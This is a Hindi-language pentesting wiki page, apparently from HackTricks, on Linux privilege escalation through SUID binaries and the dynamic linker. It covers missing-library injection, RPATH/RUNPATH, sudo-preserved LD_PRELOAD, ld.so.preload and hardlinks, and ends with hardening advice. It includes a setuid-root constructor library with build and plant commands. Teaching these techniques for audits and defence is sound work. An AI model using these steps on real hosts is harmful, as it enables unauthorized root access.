# SUID Shared Library और Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries की आमतौर पर direct command execution के लिए समीक्षा की जाती है, लेकिन custom SUID programs dynamic linker के माध्यम से भी vulnerable हो सकते हैं। सामान्य विषय सरल है: कोई privileged executable ऐसे path या configuration से code load करता है, जिसे lower-privileged user प्रभावित कर सकता है।<sup>[[1]](#references)</sup>

यह पेज generic technique patterns पर केंद्रित है: missing libraries, writable library directories, `RPATH`/`RUNPATH`, sudo के माध्यम से `LD_PRELOAD`, linker configuration और SUID hardlink confusion।

## Fast Enumeration

असामान्य SUID files खोजकर और यह जांचकर शुरुआत करें कि क्या वे dynamically linked हैं:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
गैर-मानक स्थानों, custom application paths, root के स्वामित्व वाली लेकिन package-managed directories के बाहर स्थित binaries, और writable directories से load की जाने वाली dependencies पर ध्यान दें।<sup>[[1]](#references)</sup>

उपयोगी writeability checks:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

कुछ custom SUID binaries ऐसे shared object को load करने का प्रयास करते हैं जो मौजूद नहीं होता। यदि missing path attacker द्वारा नियंत्रित directory के अंतर्गत है, तो binary attacker-supplied code को effective user के रूप में load कर सकती है।<sup>[[1]](#references)</sup>

`strace` के syscall filter से failed library lookups खोजें:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
यदि binary `libexample.so` के लिए writable path में खोज करता है, तो एक minimal proof library constructor का उपयोग कर सकती है। Validation के दौरान proof-of-impact को harmless रखें:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
इसे उसी exact filename के साथ build करें जिसे binary load करने का प्रयास करती है:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Exploitable condition केवल missing library नहीं है। Attacker को privileged loader द्वारा स्वीकार किए जाने वाले path पर compatible shared object रखने में सक्षम होना चाहिए।<sup>[[1]](#references)</sup>

## Writable Library Directory

कभी-कभी सभी dependencies मौजूद होती हैं, लेकिन उन्हें resolve करने के लिए उपयोग की जाने वाली directories में से कोई एक writable होती है। इससे loaded library को replace करना या उसी नाम वाली higher-priority library को plant करना संभव हो सकता है।<sup>[[1]](#references)</sup>

Dependency paths की समीक्षा करें:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
यदि directory writable है, तो lab में copy-safe approach से validate करें। Live host पर system libraries को replace करने से concurrently शुरू होने वाली processes inconsistent library versions के साथ चल सकती हैं।<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` और `RUNPATH` dynamic-section entries हैं, जो loader को बताते हैं कि libraries के लिए कहाँ search करना है। SUID programs में ये तब dangerous होते हैं, जब ये attacker-writable directories की ओर point करते हैं।<sup>[[1]](#references)</sup>

उन्हें detect करें:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
उदाहरण जोखिमपूर्ण आउटपुट:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
यदि `/opt/app/lib` writable है और binary को `libcustom.so` की आवश्यकता है, तो attacker वहां एक malicious `libcustom.so` रख सकता है:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` और `RUNPATH` सभी resolution details में समान नहीं होते, लेकिन privilege-escalation review के लिए व्यावहारिक प्रश्न एक ही है: क्या SUID binary किसी library name के लिए attacker-writable directory में search करती है?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH और SUID

सामान्य programs के लिए, `LD_PRELOAD` और `LD_LIBRARY_PATH` shared object loading को force या influence कर सकते हैं। SUID programs के लिए, dynamic loader सामान्यतः secure-execution mode में प्रवेश करता है और खतरनाक environment variables को ignore करता है।<sup>[[1]](#references)</sup>

इसका अर्थ है कि केवल user द्वारा `LD_PRELOAD` set कर पाने के कारण plain SUID binary आमतौर पर vulnerable नहीं होती:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
सामान्य अपवाद ऐसी sudo policy है जो target command के लिए loader variables को सेट करने या बनाए रखने की अनुमति देती है। `sudo -l` में `env_keep+=LD_PRELOAD` या `env_keep+=LD_LIBRARY_PATH` जैसी entries देखें; यदि target dynamically linked है, तो वह attacker-controlled code load कर सकता है:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
इन मामलों को आपस में confuse न करें; ऊपर दिए गए loader और sudo policy rules इनमें अंतर स्पष्ट करते हैं:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- सामान्य SUID binary के विरुद्ध `LD_PRELOAD`: आमतौर पर secure execution द्वारा block किया जाता है।
- sudo द्वारा preserved `LD_PRELOAD`: संभावित रूप से exploitable।
- writable path में missing `.so`: तब exploitable होता है जब SUID binary स्वाभाविक रूप से उस path को load करती है।
- writable directory की ओर `RPATH`/`RUNPATH`: तब exploitable होता है जब आवश्यक library को control किया जा सके।
- `/etc/ld.so.preload` या linker config पर write access: system-wide और high impact।

## Linker Configuration

`ld.so` linker cache और `/etc/ld.so.preload` का उपयोग करता है; `ldconfig` यह cache `/etc/ld.so.conf` और उसमें शामिल files से बनाता है, जो आमतौर पर `/etc/ld.so.conf.d/` में होती हैं।<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

High-value checks:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration आमतौर पर किसी एक vulnerable SUID binary से अधिक गंभीर होता है, क्योंकि यह कई dynamically linked processes को प्रभावित कर सकता है। `/etc/ld.so.preload` विशेष रूप से खतरनाक है, क्योंकि यह privileged processes में किसी shared object को force कर सकता है।<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks एक ही SUID inode को कई नामों के अंतर्गत दिखा सकते हैं।<sup>[[9]](#references)</sup> यह किसी privileged helper को छिपाने, cleanup को भ्रमित करने या सरल path-based review को bypass करने के लिए उपयोगी है।

एक से अधिक links वाली SUID files खोजें:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
समान inode के सभी paths का निरीक्षण करें:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
यह abuse इस बात का नहीं है कि hardlink permissions बदलता है। यह path confusion है: किसी privileged inode तक ऐसे नाम के माध्यम से पहुँचा जा सकता है जिसकी defenders या scripts को अपेक्षा नहीं होती।<sup>[[9]](#references)</sup> inode और hardlink workflow की अधिक जानकारी के लिए [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) देखें।

## रक्षात्मक टिप्पणियाँ

- SUID binaries को यथासंभव minimal, audited और package-managed रखें।
- writable या application-managed directories की ओर संकेत करने वाली `RPATH`/`RUNPATH` entries से बचें।<sup>[[1]](#references)[[8]](#references)</sup>
- library directories को root-owned रखें और regular users द्वारा writable न होने दें।<sup>[[8]](#references)</sup>
- sudo के माध्यम से `LD_PRELOAD`, `LD_LIBRARY_PATH` या समान loader variables को preserve न करें।<sup>[[1]](#references)[[5]](#references)</sup>
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` और unexpected SUID files की निगरानी करें।<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- hardlinked SUID files की समीक्षा करें और standard system paths के बाहर मौजूद custom SUID wrappers की जाँच करें।<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
